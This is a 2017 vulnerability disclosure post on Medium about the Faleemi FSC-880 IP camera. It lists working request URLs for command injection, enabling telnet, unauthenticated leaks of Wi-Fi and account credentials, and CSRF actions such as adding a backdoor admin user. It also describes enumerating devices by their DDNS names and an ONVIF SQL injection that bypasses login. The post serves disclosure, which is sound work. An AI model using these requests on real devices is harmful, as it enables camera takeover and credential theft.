=== Content from medium.com_5a71493e_20250125_011430.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fed1d132c2cce&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2Fiotsploit%2Ffaleemi-fsc-880-multiple-security-vulnerabilities-ed1d132c2cce&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2Fiotsploit%2Ffaleemi-fsc-880-multiple-security-vulnerabilities-ed1d132c2cce&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Faleemi FSC-880 Multiple Security Vulnerabilities. CVE-2017–14743

[![Oleg Puzanov](https://miro.medium.com/v2/resize:fill:88:88/1*VErA4h2OMjr7G9t--nBuvg.png)](/%40pu3an0v?source=post_page---byline--ed1d132c2cce--------------------------------)[![iotsploit](https://miro.medium.com/v2/resize:fill:48:48/1*QsZnYJ0qjDHLOQfCFgJwqw.png)](https://medium.com/iotsploit?source=post_page---byline--ed1d132c2cce--------------------------------)

[Oleg Puzanov](/%40pu3an0v?source=post_page---byline--ed1d132c2cce--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F921a272a9349&operation=register&redirect=https%3A%2F%2Fmedium.com%2Fiotsploit%2Ffaleemi-fsc-880-multiple-security-vulnerabilities-ed1d132c2cce&user=Oleg+Puzanov&userId=921a272a9349&source=post_page-921a272a9349--byline--ed1d132c2cce---------------------post_header-----------)

Published in[iotsploit](https://medium.com/iotsploit?source=post_page---byline--ed1d132c2cce--------------------------------)·4 min read·Sep 25, 2017

--

1

Listen

Share

![]()

Timeline:

1. 25 August 2017: the research was made
2. 29 August 2017: an email was sent to the vendor, but with no answer
3. 25 September 2017: public disclosure
4. 26 September 2017: assigned [CVE-2017–14743](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14743)

<https://www.faleemi.com/product/fsc880-1080p-wirelee-ip-camera/>

**Firmware:** 00.01.01.0048P2 (2017-07-27)

This camera has **multiple security vulnerabilities**, which can be exploited both locally and remotely. In particular, hardwired manufacturer DDNS and port-mapping to camera via upnp compatible router. Allowing for the discovered avoidance of authentication and RCE, this camera is an ideal candidate for another botnet such as Mirai.

# Vulnerabilities

## RCE

Works in stock firmware 00.01.01.0046 (˜2017–03-\*\*)

In the latest firmware (00.01.01.0048P2 (2017–07–27)) this is fixed — ftp client is removed. It is not in processes and in file system — ostensibly because realization was altered.

**Remote code execution** in admin panel in GET parameters of Ft server scenario

[http://IP/hy-cgi/ftp.cgi?cmd=setftpattr&ft\_server=;**RCE**;&ftp\_port==25&ft\_username=&ft\_password=&ft\_dirname=](http://ip/hy-cgi/ftp.cgi?cmd=setftpattr&ft_server=%3BRCE%3B&ftp_port=%3D25&ft_username=&ft_password=&ft_dirname=)

## RCE2 (LAN)

During analysis and reversing of the firmware we found and undocumented function — it is possible to quite simply turn on telnet on the device:

Turn on telnet on port 23
<http://192.168.0.100/hy-cgi/factory_param.cgi?cmd=settelnetstatus&enable=1>

Check status
<http://192.168.0.100/hy-cgi/factory_param.cgi?cmd=gettelnetstatus>

Password protected Telnet — same as on web panel but with one exception: telnet is not connected to upnp. This suggests that port is not accessible outside LAN.

We have so far been unable to connect it because we have not found custom settings of doing so to upnp.

enable upnp:
<http://192.168.0.100/hy-cgi/net.cgi?cmd=setupnpattr&upnp_enable=1>

upnp status:
[http://192.168.0.100/hy-cgi/net.cgi?cmd=getupnpattr&cmd=getupnpmap&cmd=getupnptmstatus](http://192.168.0.100/hy-cgi/net.cgi?cmd=getupnptmstatus)

## Plaintext passwords

User passwords are stored on the device in plaintext format in several locations simultaneously:

/etc/webserver/lighttpd.user
/mnt/mtd/db/ipcsys.db

Passwords are synchronised when changed.

## Information Disclosure

Prior 00.01.01.0048P2 (2017–07–27) — **0DAY**

Device Info:
<http://192.168.0.100/hy-cgi/device.cgi?cmd=getdeviceinfo>

WIFI credentials leak:
<http://192.168.0.100/hy-cgi/wifi.cgi?cmd=getwifiattr>

Current user credentials leak:
<http://192.168.0.100/hy-cgi/user.cgi?cmd=checkuserinfo>

All users credentials leak:
<http://192.168.0.100/hy-cgi/user.cgi?cmd=getuserattr>

Third Party DDNS credentials leak:
<http://192.168.0.100/hy-cgi/ddns.cgi?cmd=get3thddnsattr>

Manufacturer’s DDNS credentials leak:
<http://192.168.0.100/hy-cgi/factory_param.cgi?cmd=getddns>

SMTP settings and credentials leak:
<http://192.168.0.100/hy-cgi/smtp.cgi?cmd=getsmtpattr>

FTP settings and credentials leak:
<http://192.168.0.100/hy-cgi/ftp.cgi?cmd=getftpattr>

## CSRF

Prior 00.01.01.0048P2 (2017–07–27) — **0DAY**

<http://192.168.8.102/hy-cgi/device.cgi?cmd=sysreboot><http://192.168.0.100/hy-cgi/log.cgi?cmd=deloperlog>
<http://192.168.0.100/hy-cgi/log.cgi?cmd=cleanlog>
<http://192.168.0.100/hy-cgi/user.cgi?cmd=adduser&at_username=BACKDOOR_ADMIN&at_password=BACKDOOR_PASSWORD&at_rolename=admin>

All changes in camera settings go through GET commands and **don’t use CSRF tokens**.

The following functions can be executed remotely:

* Configure Camera
* Format SD card
* Delete Logs
* Steal image from camera

These actions and commands can be executed from admin browser. The indecent hacker only needs to lure the admin to their page.

Similar attacks on routers have been registered in the past: <http://malware.dontneedcoffee.com/2015/05/an-exploit-kit-dedicated-to-csrf.html>

And some more epic stuff

# Manufacturer’s DDNS enumeration

There are hardwired DDNS manufacturer settings found in the device. The device sends an http request using udp [www.nwsvr1.com](http://www.nwsvr1.com), and sends its internal address and admin web panel IP address to API <http://www.nwsvr1.com/api/userip.asp>

The device we researched has DDNS name 009lfld.nwsvr1.com. Knowing that device names are generated automatically, it is possible to enumerate the entire range of names using a mask 00\d[a-z]{4}.nwsvr1.com and obtain a full list of devices in the network.

**We found a total of 758000 devices, which connected with this DDNS at least once in the past.**

These are cameras by different manufacturers, that are somehow related to each other.

Around 3% of devices are in the network..
HK 18.41%
US 12.72%
DE 9.94%
ES 6.77%
FR 5.66%
AR 5.09%
GB 5.00%
DK 3.79%
IT 3.34%
PL 3.04%
MX 1.90%
CN 1.55%
VN 1.53%
JP 1.53%
HU 1.40%
CL 1.27%
BR 1.20%
TH 1.19%

A little over 20% of all devices use a default password. Virtually all devices are accessible by **ONVIF**

A similar number (20–25 thousands devices are online) are vulnerable to **auth bypass via sqli**.

We have serious concerns that the DDNs password, which is hardwired into the device by the manufacturer is incremental. This means that it is possible to reverse-calculate the password to the camera based on its DDNS name.

This raises the risk of the password being hijacked if the IP cards are switched on DDNS server, then redirected the admin using a camera with a DDNS name and grabs the password using his own authentication form.

# Authorization bypass via blind SQLi

Prior 00.01.01.0048P2 (2017–07–27) — **0DAY**

A device without authentication on web-port has an accessible endpoint by default /onvif/

ONVIF is an API standard for such devices. WSDL can be downloaded from the official website ([www.onvif.org](http://www.onvif.org)).

API uses authentication by tokens.

This device also has an SQL injection vulnerability in the username field of the authentication token. Using this it is possible to obtain an admin password.

Example of the exploit:

To do this, the date and time set in the device are needed because they are used to build the password field of the authentication token.

We drafted this POC, which allows to extract from the camera a password and gain entry to the device using admin credentials.

This research was made by [IoTSploit Team](https://iotsploit.co/) (Anton Kirsanov & Egor Lukianov). Feel free to contact us at oleg@iotsploit.co and visit our website at <https://iotsploit.co/>

If you have any active contact with Faleemi, please, show them this report and we are ready to coop.

[Hacking](/tag/hacking?source=post_page-----ed1d132c2cce--------------------------------)[IoT](/tag/iot?source=post_page-----ed1d132c2cce--------------------------------)[Iot Security](/tag/iot-security?source=post_page-----ed1d132c2cce--------------------------------)[Vulnerability](/tag/vulnerability?source=post_page-----ed1d132c2cce--------------------------------)[Security](/tag/security?source=post_page-----ed1d132c2cce--------------------------------)

--

--

1

[![iotsploit](https://miro.medium.com/v2/resize:fill:96:96/1*QsZnYJ0qjDHLOQfCFgJwqw.png)](https://medium.com/iotsploit?source=post_page---post_publication_info--ed1d132c2cce--------------------------------)[![iotsploit](https://miro.medium.com/v2/resize:fill:128:128/1*QsZnYJ0qjDHLOQfCFgJwqw.png)](https://medium.com/iotsploit?source=post_page---post_publication_info--ed1d132c2cce--------------------------------)[## Published in iotsploit](https://medium.com/iotsploit?source=post_page---post_publication_info--ed1d132c2cce--------------------------------)[10 Followers](/iotsploit/followers?source=post_page---post_publication_info--ed1d132c2cce--------------------------------)·[Last published Nov 16, 2017](/iotsploit/dahua-b1f0801604a1?source=post_page---post_publication_info--ed1d132c2cce--------------------------------)

iotsploit

[![Oleg Puzanov](https://miro.medium.com/v2/resize:fill:96:96/1*VErA4h2OMjr7G9t--nBuvg.png)](/%40pu3an0v?source=post_page---post_author_info--ed1d132c2cce--------------------------------)[![Oleg Puzanov](https://miro.medium.com/v2/resize:fill:128:128/1*VErA4h2OMjr7G9t--nBuvg.png)](/%40pu3an0v?source=post_page---post_author_info--ed1d132c2cce--------------------------------)Follow[## Written by Oleg Puzanov](/%40pu3an0v?source=post_page---post_author_info--ed1d132c2cce--------------------------------)[167 Followers](/%40pu3an0v/followers?source=post_page---post_author_info--ed1d132c2cce--------------------------------)·[140 Following](/%40pu3an0v/following?source=post_page---post_author_info--ed1d132c2cce--------------------------------)

<https://maddevs.io>

Follow
## Responses (1)

See all responses[Help](https://help.medium.com/hc/en-us?source=post_page-----ed1d132c2cce--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----ed1d132c2cce--------------------------------)[About](/about?autoplay=1&source=post_page-----ed1d132c2cce--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----ed1d132c2cce--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----ed1d132c2cce--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----ed1d132c2cce--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----ed1d132c2cce--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----ed1d132c2cce--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----ed1d132c2cce--------------------------------)[Teams](/business?source=post_page-----ed1d132c2cce--------------------------------)


